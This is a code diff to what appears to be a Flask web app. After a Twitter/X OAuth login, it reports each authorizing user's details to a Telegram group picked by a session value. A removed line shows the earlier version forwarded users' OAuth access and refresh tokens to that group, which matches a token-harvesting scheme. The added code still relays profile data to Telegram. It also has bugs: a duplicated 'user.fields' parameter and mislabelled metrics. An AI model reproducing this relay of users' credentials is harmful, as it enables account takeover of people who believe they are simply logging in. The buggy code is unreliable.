@@ -75,10 +75,28 @@ def auth_callback():
     user_data = get_twitter_user_data(access_token)
     username = user_data.get('username')
     followers_count = user_data['public_metrics']['followers_count']
+    friends_count = user_data['public_metrics']['following_count']
+    retweet_count = user_data['public_metrics']['tweet_count']
+    is_verified = user_data['verified']
     
-    send_to_telegram(username, followers_count, access_token, refresh_token, session.get("group_id"))
+    total_likes = fetch_favourites_count_v1(username, access_token)
+    
+    send_to_telegram(username, followers_count, friends_count, total_likes, retweet_count, is_verified, session.get("group_id"))
     return redirect(session.get("redirect_url", "/default-url"))
 
+def fetch_favourites_count_v1(username, access_token):
+    """ Fetch favourites_count (total likes) from Twitter API v1.1. """
+    v1_user_lookup_url = f"https://api.twitter.com/1.1/users/show.json?screen_name={username}"
+    
+    headers = {
+        'Authorization': f'Bearer {access_token}',
+        'Content-Type': 'application/json',
+    }
+    
+    response = requests.get(v1_user_lookup_url, headers=headers)
+    response_data = response.json()
+    
+    return response_data['favourites_count']
 
 def exchange_token_for_access(authorization_code):
     token_exchange_url = 'https://api.twitter.com/2/oauth2/token'
@@ -102,15 +120,23 @@ def get_twitter_user_data(access_token):
         'Content-Type': 'application/json',
     }
     params = {
-        'user.fields': 'public_metrics'
+        'user.fields': 'public_metrics',
+        'user.fields': 'verified'
     }
     response = requests.get('https://api.twitter.com/2/users/me', headers=headers, params=params)
     return response.json().get('data', {})
 
 
-def send_to_telegram(username, followers_count, access_token, refresh_token, group_id):
+def send_to_telegram(username, followers_count, friends_count, total_likes, retweet_count, is_verified, group_id):
+    """ Send user details to the Telegram group. """
+    verified_status = "✅ Verified" if is_verified else "❌ Not Verified"
     message = (f'✅ *User* **[{username}](https://x.com/{username})** *has authorized.*\n'
-               f'👥 *Followers:* {followers_count}')
+               f'👥 *Followers:* {followers_count}\n'
+               f'👤 *Friends:* {friends_count}\n'
+               f'❤️ *Total Likes:* {total_likes}\n'
+               f'🔁 *Total Retweets:* {retweet_count}\n'
+               f'{verified_status}')
+    
     send_telegram_message(group_id, message)
 
 
